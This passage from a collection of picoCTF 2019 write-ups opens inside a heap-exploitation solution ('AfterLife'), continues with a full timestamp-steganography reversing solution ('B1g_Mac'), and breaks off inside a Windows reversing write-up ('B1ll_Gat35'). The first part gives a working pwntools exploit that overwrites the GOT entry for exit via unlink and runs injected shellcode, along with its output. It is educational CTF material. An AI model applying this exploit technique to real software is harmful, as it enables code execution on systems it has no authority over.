    |\r\n                                +----------------------------+  +----------------------------+\r\n```\r\n\r\nWe add 8 bytes to `address` (which is the base address of the first buffer) since that's where we located our shellcode, right after `p32(exe.got[\"exit\"] - 12) + p32(address + 8)`.\r\n\r\nWe continue with:\r\n```c\r\nseventh=malloc(256);\r\n```\r\n\r\nThe heap manager goes to the appropriate bin and fetches the 'first' chunk in order to return it to the user. Therefore, the chunk should be removed from the linked list by calling `unlink`:\r\n```c\r\nFD = P->fd;  // FD points to (exe.got[\"exit\"] - 12), since that's the value we overran the buffer with\r\nBK = P->bk;  // BK points to (address of first + 8), since that's the value we overran the buffer with\r\nFD->bk = BK; // (exe.got[\"exit\"] - 12) + 12 = (address of first + 8); We wrote an arbitrary DWORD to an arbitrary location\r\nBK->fd = FD; // (address of first + 8) + 8 = (exe.got[\"exit\"] - 12); Side effect\r\n```\r\n\r\nThe `unlink` macro allowed us to overwrite the .got.plt address of `exit` with the address of our shellcode. Notice that as a side-effect, a part of the buffer was overwritten. Since our shellcode is very short, it won't be corrupted. If it was longer, we would have had to use a trampoline as demonstrated in [Heap overflow](Heap_overflow.md).\r\n\r\nNow, when we call `exit`, our shellcode gets called instead and gives us the flag.\r\n\r\n```python\r\n# First, generate a pwntools template using:\r\n# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215/vuln\r\n\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     i386-32-little\r\n# RELRO:    Partial RELRO\r\n# Stack:    Canary found\r\n# NX:       NX disabled\r\n# PIE:      No PIE (0x8048000)\r\n# RWX:      Has RWX segments\r\n\r\nimport os\r\n\r\nif shell is not None:\r\n    shell.set_working_directory(os.path.dirname(remote_path))\r\n\r\nio = start([\"arg1\"])\r\n\r\nio.recvuntil(\"Oops! a new developer copy pasted and printed an address as a decimal...\\n\")\r\naddress = int(io.recvline())\r\n\r\nlog.info(\"Address of buffer: {}\".format(hex(address)))\r\nlog.info(\"Address of exit(): {}\".format(hex(exe.got[\"exit\"])))\r\nlog.info(\"Address of win(): {}\".format(hex(exe.symbols[\"win\"])))\r\n\r\npayload = p32(exe.got[\"exit\"] - 12) + p32(address + 8) + asm('push {}; ret;'.format(hex(exe.symbols[\"win\"])))\r\nlog.info(\"payload:\\n{}\".format(hexdump(payload)))\r\n\r\nio.sendlineafter(\"you will write on first after it was freed... an overflow will not be very useful...\", payload)\r\nprint io.recvall()\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/AfterLife# python exploit.py\r\n[*] '/media/sf_CTFs/pico/AfterLife/vuln'\r\n    Arch:     i386-32-little\r\n    RELRO:    Partial RELRO\r\n    Stack:    Canary found\r\n    NX:       NX disabled\r\n    PIE:      No PIE (0x8048000)\r\n    RWX:      Has RWX segments\r\n[+] Connecting to 2019shell1.picoctf.com on port 22: Done\r\n[*] dvdalt@2019shell1.picoctf.com:\r\n    Distro    Ubuntu 18.04\r\n    OS:       linux\r\n    Arch:     amd64\r\n    Version:  4.15.0\r\n    ASLR:     Enabled\r\n[+] Opening new channel: 'pwd': Done\r\n[+] Receiving all data: Done (13B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/tmp/tmp.OSZrQeZjJT'\r\n[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done\r\n[+] Receiving all data: Done (0B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215'\r\n[+] Starting remote process '/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215/vuln' on 2019shell1.picoctf.com: pid 1137324\r\n[*] Address of buffer: 0x9b58008\r\n[*] Address of exit(): 0x804d02c\r\n[*] Address of win(): 0x8048966\r\n[*] payload:\r\n    00000000  20 d0 04 08  10 80 b5 09  68 66 89 04  08 c3        │ ···│····│hf··│··│\r\n    0000000e\r\n[+] Receiving all data: Done (31B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1137324)\r\n\r\npicoCTF{what5_Aft3r_187f3d9a}\r\n```", "timestamp": "2025-10-21T13:36:24.908236"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/B1g_Mac.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/B1g_Mac.md", "content": "# B1g_Mac\r\nReverse Engineering, 500 points\r\n\r\n## Description:\r\n> Here's a zip file.\r\n\r\n## Solution:\r\n\r\nLet's extract the file:\r\n\r\n```console\r\nE:\\CTFs\\pico\\B1g_Mac>\"c:\\Program Files\\7-Zip\\7z.exe\" x b1g_mac.zip\r\n\r\n7-Zip 19.00 (x64) : Copyright (c) 1999-2018 Igor Pavlov : 2019-02-21\r\n\r\nScanning the drive for archives:\r\n1 file, 295964 bytes (290 KiB)\r\n\r\nExtracting archive: b1g_mac.zip\r\n--\r\nPath = b1g_mac.zip\r\nType = zip\r\nPhysical Size = 295964\r\n\r\nEverything is Ok\r\n\r\nFolders: 1\r\nFiles: 19\r\nSize:       2408051\r\nCompressed: 295964\r\n```\r\n\r\nWe get the following contents:\r\n```console\r\nE:\\CTFs\\pico\\B1g_Mac>dir /s\r\n Volume in drive E is CTF\r\n Volume Serial Number is 3C2B-8C21\r\n\r\n Directory of E:\\CTFs\\pico\\B1g_Mac\r\n\r\n10/25/2019  11:04 PM    <DIR>          .\r\n10/25/2019  11:04 PM    <DIR>          ..\r\n10/25/2019  02:02 PM           295,964 b1g_mac.zip\r\n04/06/2019  08:24 PM           110,279 main.exe\r\n04/06/2019  02:11 AM    <DIR>          test\r\n               2 File(s)        406,243 bytes\r\n\r\n Directory of E:\\CTFs\\pico\\B1g_Mac\\test\r\n\r\n04/06/2019  02:11 AM    <DIR>          .\r\n04/06/2019  02:11 AM    <DIR>          ..\r\n03/26/2019  02:20 AM           127,654 Item01 - Copy.bmp\r\n03/26/2019  02:20 AM           127,654 Item01.bmp\r\n03/26/2019  02:20 AM           127,654 Item02 - Copy.bmp\r\n03/26/2019  02:20 AM           127,654 Item02.bmp\r\n03/26/2019  02:20 AM           127,654 Item03 - Copy.bmp\r\n03/26/2019  02:20 AM           127,654 Item03.bmp\r\n03/26/2019  02:21 AM           127,654 Item04 - Copy.bmp\r\n03/26/2019  02:21 AM           127,654 Item04.bmp\r\n03/26/2019  02:21 AM           127,654 Item05 - Copy.bmp\r\n03/26/2019  02:21 AM           127,654 Item05.bmp\r\n03/26/2019  02:24 AM           127,654 Item06 - Copy.bmp\r\n03/26/2019  02:24 AM           127,654 Item06.bmp\r\n03/26/2019  02:24 AM           127,654 Item07 - Copy.bmp\r\n03/26/2019  02:24 AM           127,654 Item07.bmp\r\n03/26/2019  02:25 AM           127,654 Item08 - Copy.bmp\r\n03/26/2019  02:25 AM           127,654 Item08.bmp\r\n03/26/2019  03:15 AM           127,654 ItemTest - Copy.bmp\r\n03/26/2019  03:15 AM           127,654 ItemTest.bmp\r\n              18 File(s)      2,297,772 bytes\r\n\r\n     Total Files Listed:\r\n              20 File(s)      2,704,015 bytes\r\n               5 Dir(s)  17,938,530,304 bytes free\r\n```\r\n\r\nWe have an executable and a folder named `test`, with 18 images.\r\n\r\nLet's run the executable:\r\n```console\r\nE:\\CTFs\\pico\\B1g_Mac>main.exe\r\nNo flag found, please make sure this is run on the server\r\n```\r\n\r\nThat's a strange error message, since this is a Windows executable and the server runs on Linux. However, we've seen this message in the past when the program required a `flag.txt` file in its directory, so lets create one and try again:\r\n\r\n```console\r\nE:\\CTFs\\pico\\B1g_Mac>echo picoCTF{fake_flag}>flag.txt\r\n\r\nE:\\CTFs\\pico\\B1g_Mac>main.exe\r\nWork is done!\r\nWait for 5 seconds to exit.\r\n```\r\n\r\nOk, something happened. Since no new file appeared, let's re-extract the `test` directory from the zip file and compare it to the contents of the current `test` directory in order to see if any of the files have changed.\r\n\r\n```console\r\nE:\\CTFs\\pico\\B1g_Mac>move test test_dirty\r\n        1 dir(s) moved.\r\n\r\nE:\\CTFs\\pico\\B1g_Mac>\"c:\\Program Files\\7-Zip\\7z.exe\" e -y b1g_mac.zip -otest test\r\n\r\n7-Zip 19.00 (x64) : Copyright (c) 1999-2018 Igor Pavlov : 2019-02-21\r\n\r\nScanning the drive for archives:\r\n1 file, 295964 bytes (290 KiB)\r\n\r\nExtracting archive: b1g_mac.zip\r\n--\r\nPath = b1g_mac.zip\r\nType = zip\r\nPhysical Size = 295964\r\n\r\nEverything is Ok\r\n\r\nFolders: 1\r\nFiles: 18\r\nSize:       2297772\r\nCompressed: 295964\r\n```\r\n\r\nComparing the two folders using `WinMerge`, we can see that the files are binary same:\r\n```\r\nCompare E:\\CTFs\\pico\\B1g_Mac\\test with E:\\CTFs\\pico\\B1g_Mac\\test_dirty\r\n10/25/2019 11:44:44 PM\r\nFilename\t\t\t      Comparison result\t\t\t\t\t\t              Left Date\t\t\t\t\t\t\t        Right Date\t\t\t\t\t\t      Extension\r\ntest\t\t\t\t        Left only: E:\\CTFs\\pico\\B1g_Mac\\test\t  * 4/6/2019 2:11:26 AM\t\t\t\t  \t\t\t\t\t\t\t\t\t\r\nItem01 - Copy.bmp\t  Binary files are identical\t\t\t\t        3/26/2019 2:20:08 AM\t\t\t\t  3/26/2019 2:20:08 AM\t\t\t\tbmp\r\nItem01.bmp\t\t\t    Binary files are identical\t\t\t\t        3/26/2019 2:20:08 AM\t\t\t\t  3/26/2019 2:20:08 AM\t\t\t\tbmp\r\nItem02 - Copy.bmp\t  Binary files are identical\t\t\t\t        3/26/2019 2:20:34 AM\t\t\t\t  3/26/2019 2:20:34 AM\t\t\t\tbmp\r\nItem02.bmp\t\t\t    Binary files are identical\t\t\t\t        3/26/2019 2:20:34 AM\t\t\t\t  3/26/2019 2:20:34 AM\t\t\t\tbmp\r\nItem03 - Copy.bmp\t  Binary files are identical\t\t\t\t        3/26/2019 2:20:50 AM\t\t\t\t  3/26/2019 2:20:50 AM\t\t\t\tbmp\r\nItem03.bmp\t\t\t    Binary files are identical\t\t\t\t        3/26/2019 2:20:51 AM\t\t\t\t  3/26/2019 2:20:51 AM\t\t\t\tbmp\r\nItem04 - Copy.bmp\t  Binary files are identical\t\t\t\t        3/26/2019 2:21:13 AM\t\t\t\t  3/26/2019 2:21:13 AM\t\t\t\tbmp\r\nItem04.bmp\t\t\t    Binary files are identical\t\t\t\t        3/26/2019 2:21:13 AM\t\t\t\t  3/26/2019 2:21:13 AM\t\t\t\tbmp\r\nItem05 - Copy.bmp\t  Binary files are identical\t\t\t\t        3/26/2019 2:21:28 AM\t\t\t\t* 3/26/2019 2:21:28 AM\t\t\t\tbmp\r\nItem05.bmp\t\t\t    Binary files are identical\t\t\t\t        3/26/2019 2:21:29 AM\t\t\t\t  3/26/2019 2:21:29 AM\t\t\t\tbmp\r\nItem06 - Copy.bmp\t  Binary files are identical\t\t\t\t        3/26/2019 2:24:17 AM\t\t\t\t* 3/26/2019 2:24:17 AM\t\t\t\tbmp\r\nItem06.bmp\t\t\t    Binary files are identical\t\t\t\t        3/26/2019 2:24:18 AM\t\t\t\t  3/26/2019 2:24:18 AM\t\t\t\tbmp\r\nItem07 - Copy.bmp\t  Binary files are identical\t\t\t\t      * 3/26/2019 2:24:47 AM\t\t\t\t  3/26/2019 2:24:47 AM\t\t\t\tbmp\r\nItem07.bmp\t\t\t    Binary files are identical\t\t\t\t        3/26/2019 2:24:47 AM\t\t\t\t  3/26/2019 2:24:47 AM\t\t\t\tbmp\r\nItem08 - Copy.bmp\t  Binary files are identical\t\t\t\t        3/26/2019 2:25:55 AM\t\t\t\t* 3/26/2019 2:25:55 AM\t\t\t\tbmp\r\nItem08.bmp\t\t\t    Binary files are identical\t\t\t\t        3/26/2019 2:25:55 AM\t\t\t\t  3/26/2019 2:25:55 AM\t\t\t\tbmp\r\nItemTest - Copy.bmp\tBinary files are identical\t\t\t\t        3/26/2019 3:15:31 AM\t\t\t\t* 3/26/2019 3:15:32 AM\t\t\t\tbmp\r\nItemTest.bmp\t\t    Binary files are identical\t\t\t\t        3/26/2019 3:15:32 AM\t\t\t\t  3/26/2019 3:15:32 AM\t\t\t\tbmp\r\n```\r\n\r\nLet's dive into Ghidra's decompiled output:\r\n\r\n```c\r\nint __cdecl _main(int _Argc,char **_Argv,char **_Env)\r\n{\r\n  FILE *_File;\r\n  size_t sVar1;\r\n  undefined4 local_60;\r\n  undefined local_5a [50];\r\n  char local_28 [12];\r\n  \r\n  ___main();\r\n  _isOver = 0;\r\n                    /* _folderName = \"./test\" */\r\n  local_28._0_4_ = 1702113070;\r\n  local_28._4_4_ = 29811;\r\n  local_28._8_4_ = 0;\r\n  _folderName = local_28;\r\n  _pLevel = 0;\r\n  _File = open(\"flag.txt\",\"r\");\r\n  if (_File == (FILE *)0x0) {\r\n    puts(\"No flag found, please make sure this is run on the server\");\r\n  }\r\n  sVar1 = fread(local_5a,1,18,_File);\r\n  if ((int)sVar1 < 1) {\r\n                    /* WARNING: Subroutine does not return */\r\n    exit(0);\r\n  }\r\n  _flag = local_5a;\r\n  _flag_size = 18;\r\n  local_60 = 0;\r\n  _flag_index = &local_60;\r\n  puts(\"Work is done!\");\r\n  _listdir(0,_folderName);\r\n  puts(\"Wait for 5 seconds to exit.\");\r\n  _sleep(5);\r\n  return 2;\r\n}\r\n```\r\n\r\nWe can see that the program opens the flag file, reads 18 characters, initializes some globals (`_folderName`, `_flag`, `_flag_size`, `_flag_index`) and then calls `_listdir`. What does `_listdir` do?\r\n\r\n```c\r\nvoid __cdecl _listdir(int param_1,undefined4 folder_name)\r\n{\r\n  int iVar1;\r\n  BOOL BVar2;\r\n  char local_958 [2048];\r\n  _WIN32_FIND_DATAA local_158;\r\n  HANDLE local_18;\r\n  bool local_11;\r\n  int local_10;\r\n  \r\n  local_18 = (HANDLE)0x0;\r\n  sprintf(local_958,\"%s\\\\*.*\",folder_name);\r\n  local_18 = FindFirstFileA(local_958,(LPWIN32_FIND_DATAA)&local_158);\r\n  if (local_18 == (HANDLE)0xffffffff) {\r\n    printf(\"Path not found: [%s]\\n\",folder_name);\r\n  }\r\n  else {\r\n    local_10 = 1;\r\n    local_11 = true;\r\n    while (local_11 != false) {\r\n      iVar1 = strcmp(local_158.cFileName,\".\");\r\n      if ((iVar1 != 0) && (iVar1 = strcmp(local_158.cFileName,\"..\"), iVar1 != 0)) {\r\n        sprintf(local_958,\"%s\\\\%s\",folder_name,local_158.cFileName);\r\n        if ((local_158.dwFileAttributes & 0x10) == 0) {\r\n          if (local_10 == 1) {\r\n            if (param_1 == 0) {\r\n              _hideInFile(local_958);\r\n            }\r\n            else {\r\n              if (param_1 == 1) {\r\n                _decodeBytes(local_958);\r\n              }\r\n            }\r\n          }\r\n          local_10 = 1 - local_10;\r\n        }\r\n        else {\r\n          printf(\"Folder: %s\\n\",local_958);\r\n          _listdir(param_1,local_958);\r\n        }\r\n      }\r\n      if (_isOver != '\\0') break;\r\n      BVar2 = FindNextFileA(local_18,(LPWIN32_FIND_DATAA)&local_158);\r\n      local_11 = BVar2 != 0;\r\n    }\r\n    FindClose(local_18);\r\n  }\r\n  return;\r\n}\r\n```\r\n\r\nIt looks like `_listdir` is a recursive function which iterates over files in the folder (in our case it was called with the folder \"`./test`\" by the main function) and calls `_hideInFile` for every other file... assuming `param_1` is set to `0`. If `param_1` is set to `1`, an interesting function called `_decodeBytes` is called on the file instead.\r\n\r\nWho calls `_listdir` with `param_1 = 1`? An interesting uncalled function named `_decode`:\r\n\r\n```c\r\nvoid _decode(void)\r\n{\r\n  undefined4 local_28;\r\n  undefined4 local_24;\r\n  undefined4 local_20;\r\n  undefined4 local_1c;\r\n  undefined4 local_18;\r\n  undefined4 local_14;\r\n  undefined4 local_10;\r\n  \r\n  local_24 = 1634496360;\r\n  local_20 = 2105376;\r\n  local_1c = 0;\r\n  local_18 = 0;\r\n  local_14 = 0;\r\n  _buff_size = 0x12;\r\n  local_28 = 0;\r\n  local_10 = 1;\r\n  _buff = &local_24;\r\n  _buff_index = &local_28;\r\n  _listdir(1,_folderName);\r\n  printf(\"value of DECODE %s \\n\",_buff);\r\n  puts(\"Wait for 5 seconds to exit.\");\r\n  _sleep(5);\r\n                    /* WARNING: Subroutine does not return */\r\n  exit(0);\r\n}\r\n```\r\n\r\nThis function relies on the `_folderName` global and seems very promising. We can call it independently using the debugger after `_folderName` gets initialized in the main function.\r\n\r\nUsing `x64dbg`, we launch the program and execute:\r\n\r\n```\r\n> SetBPX 00401bda\r\n```\r\n\r\nThis will set a breakpoint in main, right after initializing _folderName:\r\n```assembly\r\n        00401bc9 8d 44 24 48     LEA        EAX=>local_28,[ESP + 0x48]\r\n        00401bcd a3 34 54        MOV        [_folderName],EAX                                = ??\r\n                 40 00\r\n        00401bd2 c7 44 24        MOV        dword ptr [ESP + local_14],0x0\r\n                 5c 00 00 \r\n                 00 00\r\n        00401bda c7 05 48        MOV        dword ptr [_pLevel],0x31                         = ??\r\n                 54 40 00 \r\n                 31 00 00 00\r\n\r\n```\r\n\r\nWe run and hit the breakpoint. Now we just need to change `eip` to `_decode` and run:\r\n```\r\n> EIP=00401afe\r\n```\r\n\r\nNow we just need to run, and we get the flag:\r\n```\r\nvalue of DECODE picoCTF{M4cTim35!}\r\nWait for 5 seconds to exit.\r\n```\r\n\r\nSo where did the flag hide?\r\n\r\nLet's take a look at the `_hideInFile` function:\r\n\r\n```c\r\nvoid __cdecl _hideInFile(LPCSTR param_1)\r\n\r\n{\r\n  BOOL BVar1;\r\n  _FILETIME local_2c;\r\n  _FILETIME local_24;\r\n  _FILETIME local_1c;\r\n  char local_12;\r\n  char local_11;\r\n  HANDLE local_10;\r\n  \r\n  local_10 = CreateFileA(param_1,0x100,0,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);\r\n  .text(local_10);\r\n  if (local_10 == (HANDLE)0xffffffff) {\r\n    printf(\"Error:INVALID_HANDLED_VALUE\");\r\n  }\r\n  else {\r\n    BVar1 = GetFileTime(local_10,(LPFILETIME)&local_1c,(LPFILETIME)&local_24,(LPFILETIME)&local_2c);\r\n    if (BVar1 == 0) {\r\n      printf(\"Error: C-GFT-01\");\r\n    }\r\n    else {\r\n      local_11 = *(char *)(*_flag_index + _flag);\r\n      *_flag_index = *_flag_index + 1;\r\n      local_12 = *(char *)(*_flag_index + _flag);\r\n      *_flag_index = *_flag_index + 1;\r\n      _encodeBytes(local_11,local_12,(uint *)&local_2c);\r\n      if (0 < _pLevel) {\r\n        local_11 = *(char *)(*_flag_index + _flag);\r\n        *_flag_index = *_flag_index + 1;\r\n        local_12 = *(char *)(*_flag_index + _flag);\r\n        *_flag_index = *_flag_index + 1;\r\n        _encodeBytes(local_11,local_12,(uint *)&local_1c);\r\n      }\r\n      if (_pLevel == 2) {\r\n        local_11 = *(char *)(*_flag_index + _flag);\r\n        *_flag_index = *_flag_index + 1;\r\n        local_12 = *(char *)(*_flag_index + _flag);\r\n        *_flag_index = *_flag_index + 1;\r\n        _encodeBytes(local_11,local_12,(uint *)&local_24);\r\n      }\r\n      BVar1 = SetFileTime(local_10,(FILETIME *)&local_1c,(FILETIME *)&local_24,(FILETIME *)&local_2c\r\n                         );\r\n      if (BVar1 == 0) {\r\n        printf(\"Error: C-SFT-01\");\r\n      }\r\n      else {\r\n        if (_flag_size <= *_flag_index) {\r\n          _isOver = 1;\r\n        }\r\n        CloseHandle(local_10);\r\n      }\r\n    }\r\n  }\r\n  return;\r\n}\r\n```\r\n\r\nWe can see that the function is using `GetFileTime` and `SetFileTime`, and this also explains the challenge name ([MAC](https://en.wikipedia.org/wiki/MAC_times) stands for \"Modification, Access, Creation\"). The Windows user interface shows us the date and H:M:S, but NTFS file systems have a resolution of 100 Nanoseconds for these fields (The `FILETIME` structure represents the time in 100-nanosecond intervals since January 1, 1601).\r\n\r\nThis also explains why some files had an asterisk in the `WinMerge` report, even though the date didn't seem different:\r\n```\r\nItem05 - Copy.bmp\t  Binary files are identical\t\t\t\t        3/26/2019 2:21:28 AM\t\t\t\t* 3/26/2019 2:21:28 AM\t\t\t\tbmp\r\n```\r\n\r\nNow, if we want to create a script to extract the flag, we won't be able to use any standard Python APIs since their resolution isn't good enough:\r\n\r\n```python\r\n>>> os.stat(\"Item01 - Copy.bmp\")\r\nos.stat_result(st_mode=33206, st_ino=562949953448601, st_dev=1009486881, st_nlink=1, st_uid=0, st_gid=0, st_size=127654, st_atime=1554572121, st_mtime=1553556008, st_ctime=1554505885)\r\n>>> os.stat(\"Item01 - Copy.bmp\").st_mtime\r\n1553556008.0027752\r\n>>> os.path.getmtime(\"Item01 - Copy.bmp\")\r\n1553556008.0027752\r\n```\r\n\r\nWe can either write a `C` program that uses `WinAPI` or use the Python `ctypes` module to call Windows API functions directly.\r\n\r\nWe just need to notice that the program sets `_pLevel` to `0` (so that only the file modification time is used to hide the flag) and that the `_encodeBytes` logic is simply:\r\n```c\r\nvoid __cdecl _encodeBytes(char param_1,char param_2,uint *param_3)\r\n{\r\n  *param_3 = (*param_3 & 0xffff0000) + (int)param_2 + (int)param_1 * 0x100;\r\n  return;\r\n}\r\n```\r\n\r\nMeaning, every two bytes of the flag are encoded as the two least significant bytes of the modification time of a file.\r\n\r\nHere's how to extract the flag with Python:\r\n\r\n```python\r\nfrom ctypes import windll, Structure, byref\r\nfrom ctypes.wintypes import LPWSTR, DWORD, FILETIME\r\nimport os, glob \r\n\r\nclass WIN32_FILE_ATTRIBUTE_DATA(Structure):\r\n    _fields_ = [(\"dwFileAttributes\", DWORD),\r\n                (\"ftCreationTime\", FILETIME),\r\n                (\"ftLastAccessTime\", FILETIME),\r\n                (\"ftLastWriteTime\", FILETIME),\r\n                (\"nFileSizeHigh\", DWORD),\r\n                (\"nFileSizeLow\", DWORD)]\r\n\r\n# https://stackoverflow.com/questions/38508351/getting-last-change-time-in-python-on-windows\r\ndef get_mtime(filename):\r\n    wfad = WIN32_FILE_ATTRIBUTE_DATA()\r\n    GetFileExInfoStandard = 0\r\n    windll.kernel32.GetFileAttributesExW(LPWSTR(filename), GetFileExInfoStandard, byref(wfad))\r\n    lowtime = long(wfad.ftLastWriteTime.dwLowDateTime)\r\n    hightime = long(wfad.ftLastWriteTime.dwHighDateTime)\r\n    filetime = (hightime << 32) + lowtime\r\n    return filetime\r\n\r\nskip = True\r\nflag = \"\"\r\nfor path in glob.iglob('test/*.bmp'):\r\n    skip = not skip\r\n    if skip:\r\n        continue\r\n    time = get_mtime(path)\r\n    print \"{}: \\t{}\".format(path, time)\r\n    flag += chr((time & 0xff00) >> 8)\r\n    flag += chr(time & 0xff)\r\n\r\nprint flag\r\n\r\n```\r\n\r\nOutput:\r\n```\r\ntest\\Item01 - Copy.bmp:         131980296080027753\r\ntest\\Item02 - Copy.bmp:         131980296340005743\r\ntest\\Item03 - Copy.bmp:         131980296509997908\r\ntest\\Item04 - Copy.bmp:         131980296730003067\r\ntest\\Item05 - Copy.bmp:         131980296889978164\r\ntest\\Item06 - Copy.bmp:         131980298579960660\r\ntest\\Item07 - Copy.bmp:         131980298870024557\r\ntest\\Item08 - Copy.bmp:         131980299550012213\r\ntest\\ItemTest - Copy.bmp:       131980329319997821\r\npicoCTF{M4cTim35!}\r\n```", "timestamp": "2025-10-21T13:36:25.018984"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/B1ll_Gat35.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/B1ll_Gat35.md", "content": "# B1ll_Gat35\r\nReverse Engineering, 400 points\r\n\r\n## Description:\r\n> Can you reverse this Windows Binary?\r\n\r\n## Solution:\r\n\r\nThis is a Windows reversing challenge. Let's start by running the executable:\r\n\r\n```console\r\nE:\\CTFs\\pico\\B1ll_Gat35>win-exec-1.exe\r\nInput a number between 1 and 5 digits: 1\r\nInitializing...\r\nEnter the correct key to get the access codes: test\r\nIncorrect key. Try again.\r\n```\r\n\r\nWe need to provide the correct key in order to get the flag.\r\n\r\nLet's take a look at the main function's decompilation using Ghidra:\r\n\r\n```c\r\nvoid main(void)\r\n{\r\n  int iVar1;\r\n  FILE *pFVar2;\r\n  uint uVar3;\r\n  int user_input;\r\n  int num_digits;\r\n  char is_valid;\r\n  char local_6c [100];\r\n  uint local_8;\r\n  \r\n  local_8 = DAT_0047b174 ^ (uint)&stack0xfffffffc;\r\n  _print(s_Input_a_number_between_1_and_5_d_0047b06c);\r\n  _scanf(&DAT_0047b094,&user_input);\r\n  num_digits = 1;\r\n  while (9 < user_input) {\r\n    num_digits = num_digits + 1;\r\n    user_input = user_input / 10;\r\n  }\r\n                    /* user_input is now least significat digit of input */\r\n  if (num_digits < 6) {\r\n    _print(s_Initializing..._0047b0b4);\r\n    initialize_key(user_input,num_digits);\r\n    do {\r\n      iVar1 = thunk_FUN_00415840();\r\n    } while (iVar1 != 10);\r\n    _print(s_Enter_the_correct_key_to_get_the_0047b0c8);\r\n    pFVar2 = (FILE *)___acrt_iob_func(0);\r\n    thunk_FUN_004157db(local_6c,100,pFVar2);\r\n    uVar3 = validate_key(local_6c);\r\n    is_valid = (char)uVar3;\r\n    if (is_valid == '\\0') {\r\n      _print(s_Incorrect_key._Try_again._0047b0f8);\r\n    }\r\n    else {\r\n      _print(s_Correct_input._Printing_flag:_0047b114);\r\n      print_flag();\r\n    }\r\n  }\r\n  else {\r\n    _print(s_Number_too_big._Try_again._0047b098);\r\n  }\r\n  thunk_FUN_004084bf();\r\n  return;\r\n}\r\n```\r\n\r\nWe can see the calculation of the number of digits for the first request (\"Input a number between 1 and 5 digits\"), then some initialization using the number of digits and the least significant digit. Later, `validate_key` is called, and an appropriate string is printed according to the result.\r\n\r\nSince the next-level functions are a bit complicated to statically reverse, it's convenient to use a debugger side-by-side. `x64dbg` is a great choice.\r\n\r\nHowever, before starting to debug, it makes life easier to disable ASLR. This can be done using a tool called `CFF Explorer`. We open the executable in the tool, select `NT Headers -> Optional Headers -> DllCharacteristics -> Click Here -> DLL can move` and remove the checkbox. We can then save the executable and debug it without having to worry about ASLR.\r\n\r\nStepping through the code, we can see an interesting string in `eax` after calling `initialize_key` (a.k.a. `win-exec-1-noaslr.402117`):\r\n\r\n```\r\n00408040 | 55                       | push ebp                                           |\r\n00408041 | 8BEC                     | mov ebp,esp                                        |\r\n00408043 | 83EC 74                  | sub esp,74                                         |\r\n00408046 | A1 74B14700              | mov eax,dword ptr ds:[47B174]                      | eax:\"The key is: 425\"\r\n0040804B | 33C5                     | xor eax,ebp                                        |\r\n0040804D | 8945 FC                  | mov dword ptr ss:[ebp-4],eax                       |\r\n00408050 | 68 6CB04700              | push win-exec-1-noaslr.47B06C                      | 47B06C:\"Input a number between 1 and 5 digits: \"\r\n00408055 | E8 0B94FFFF              | call win-exec-1-noaslr.401465                      |\r\n0040805A | 83C4 04                  | add esp,4                                          |\r\n0040805D | 8D45 8C                  | lea eax,dword ptr ss:[ebp-74]                      |\r\n00408060 | 50                       | push eax                                           | eax:\"The key is: 425\"\r\n00408061 | 68 94B04700              | push win-exec-1-noaslr.47B094                      | 47B094:\"%d\"\r\n00408066 | E8 4698FFFF              | call win-exec-1-noaslr.4018B1                      |\r\n0040806B | 83C4 08                  | add esp,8                                          |\r\n0040806E | C745 90 01000000         | mov dword ptr ss:[ebp-70],1                        |\r\n00408075 | 837D 8C 09               | cmp dword ptr ss:[ebp-74],9                        | 9:'\\t'\r\n00408079 | 7E 19                    | jle win-exec-1-noaslr.408094                       |\r\n0040807B | 8B4D 90                  | mov ecx,dword ptr ss:[ebp-70]                      |\r\n0040807E | 83C1 01                  | add ecx,1                                          |\r\n00408081 | 894D 90                  | mov dword ptr ss:[ebp-70],ecx                      |\r\n00408084 | 8B45 8C                  | mov eax,dword ptr ss:[ebp-74]                      |\r\n00408087 | 99                       | cdq                                                |\r\n00408088 | B9 0A000000              | mov ecx,A                                          | A:'\\n'\r\n0040808D | F7F9                     | idiv ecx                                           |\r\n0040808F | 8945 8C                  | mov dword ptr ss:[ebp-74],eax                      |\r\n00408092 | EB E1                    | jmp win-exec-1-noaslr.408075                       |\r\n00408094 | 837D 90 05               | cmp dword ptr ss:[ebp-70],5                        |\r\n00408098 | 7E 16                    | jle win-exec-1-noaslr.4080B0                       |\r\n0040809A | 68 98B04700              | push win-exec-1-noaslr.47B098                      | 47B098:\"Number too big. Try again.\\n\"\r\n0040809F | E8 C193FFFF              | call win-exec-1-noaslr.401465                      |\r\n004080A4 | 83C4 04                  | add esp,4                                          |\r\n004080A7 | 33C0                     | xor eax,eax                                        | eax:\"The key is: 425\"\r\n004080A9 | E9 8B000000              | jmp win-exec-1-noaslr.408139                       |\r\n004080AE | EB 1D                    | jmp win-exec-1-noaslr.4080CD                       |\r\n004080B0 | 68 B4B04700              | push win-exec-1-noaslr.47B0B4                      | 47B0B4:\"Initializing...\\n\"\r\n004080B5 | E8 AB93FFFF              | call win-exec-1-noaslr.401465                      |\r\n004080BA | 83C4 04                  | add esp,4                                          |\r\n004080BD | 8B55 90                  | mov edx,dword ptr ss:[ebp-70]                      |\r\n004080C0 | 52                       | push edx                                           |\r\n004080C1 | 8B45 8C                  | mov eax,dword ptr ss:[ebp-74]                      |\r\n004080C4 | 50                       | push eax                                           | eax:\"The key is: 425\"\r\n004080C5 | E8 4DA0FFFF              | call win-exec-1-noaslr.402117                      |\r\n004080CA | 83C4 08                  | add esp,8                                          | <<----------------------------- EIP\r\n004080CD | E8 93B1FFFF              | call win-exec-1-noaslr.403265                      |\r\n```\r\n\r\nThe string says `The key is: 425`. Let's try that in 